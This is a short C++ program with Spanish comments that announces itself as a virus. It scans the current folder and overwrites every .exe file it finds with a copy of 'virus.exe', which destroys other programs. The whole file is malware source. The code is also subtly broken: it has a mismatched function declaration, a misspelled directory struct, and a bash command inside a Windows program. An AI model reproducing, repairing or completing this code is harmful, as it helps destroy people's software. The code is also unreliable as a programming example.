#include<iostream>
#include<fstream>
#include<string.h>
#include<dirent.h>
#include<windows.h>
using namespace std;
void soloExe(string archivo); 
int main()
{
    cout<<"Soy un virus\n";
    string nombreArchivos;
    DIR *directorio;
    int tipo;
    struct diferent *elementos;
    if(directorio = opendir("."))
    {
        while (elementos = readdir(directorio))
        {
            nombreArchivos = elementos->d_name;
            tipo = elementos->d_type;
            if ((nombreArchivos != ".")&&(nombreArchivos != "..")&&(tipo == 0)&&(soloExe(nombreArchivos))) //TODO: los elementos de tipo 0 son los archivos
            {
                CopyFile("virus.exe",nombreArchivos.c_str(),false);
            }
        }
    }
    system("\nread -p '\nPresiona Enter para continuar...' var");
}
bool soloExe(string archivo)
{
    //TODO: substr es una parte del nombre.
    //TODO: find_last_of
    if (archivo.substr(archivo.find_last_of(".")+1) == "exe")
    {
        return true;
    }
    else
    {
        return false;
    }
    
}